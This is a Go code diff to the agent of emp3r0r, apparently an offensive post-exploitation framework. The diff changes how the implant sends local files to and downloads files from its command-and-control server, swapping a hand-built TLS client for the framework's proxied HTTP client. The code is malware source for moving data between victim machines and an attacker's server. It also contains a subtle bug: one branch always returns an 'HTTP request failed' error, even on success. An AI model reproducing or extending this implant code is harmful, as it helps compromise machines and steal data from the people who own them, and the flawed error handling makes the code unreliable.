@@ -2,13 +2,10 @@ package agent
 
 import (
 	"bufio"
-	"crypto/tls"
-	"crypto/x509"
 	"encoding/base64"
 	"fmt"
 	"io/ioutil"
 	"log"
-	"net/http"
 	"os"
 	"time"
 
@@ -19,7 +16,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
-// send local file to CC
+// send local file to CC, Deprecated
 func file2CC(filepath string, offset int64) (checksum string, err error) {
 	// open and read the target file
 	f, err := os.Open(filepath)
@@ -53,29 +50,13 @@ func DownloadViaCC(url, path string) (data []byte, err error) {
 	retData := false
 	if path == "" {
 		retData = true
+		log.Printf("No path specified, will return []byte")
 		path = fmt.Sprintf("%s/%s", os.TempDir(), uuid.NewString())
 	}
 
 	// use EmpHTTPClient
-	// start with an empty pool
-	rootCAs := x509.NewCertPool()
-
-	// add our cert
-	if ok := rootCAs.AppendCertsFromPEM(tun.CACrt); !ok {
-		log.Println("No certs appended")
-	}
-
-	// Trust the augmented cert pool in our client
-	config := &tls.Config{
-		InsecureSkipVerify: false,
-		RootCAs:            rootCAs,
-	}
-
-	// return our http client
-	tr := &http.Transport{TLSClientConfig: config}
 	client := grab.NewClient()
-	client.HTTPClient.Timeout = time.Duration(10) * time.Second
-	client.HTTPClient.Transport = tr // use our TLS transport
+	client.HTTPClient = tun.EmpHTTPClient(emp3r0r_data.AgentProxy)
 
 	req, err := grab.NewRequest(path, url)
 	if err != nil {
@@ -85,12 +66,18 @@ func DownloadViaCC(url, path string) (data []byte, err error) {
 	resp := client.Do(req)
 	if retData {
 		data, err = ioutil.ReadFile(path)
-		return
+		return data, fmt.Errorf("HTTP request failed: %v", err)
 	}
 
 	// progress
 	t := time.NewTicker(time.Second)
-	defer t.Stop()
+	defer func() {
+		t.Stop()
+		if !retData && !util.IsFileExist(path) {
+			data = nil
+			err = fmt.Errorf("%s not found, download failed", path)
+		}
+	}()
 	for !resp.IsComplete() {
 		select {
 		case <-resp.Done:
